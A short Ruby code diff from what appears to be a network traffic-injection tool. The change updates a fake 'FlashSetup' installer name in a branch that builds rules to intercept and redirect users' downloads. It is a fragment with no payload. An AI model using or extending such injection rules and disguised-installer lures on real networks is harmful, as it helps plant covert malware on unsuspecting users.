@@ -109,7 +109,7 @@ class InjectorTask
 =end
 
         when 'INJECT-HTML-FLASH'
-          appname = 'FlashSetup-11.5.' + progressive.to_s
+          appname = 'FlashSetup-11.8.' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
           temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
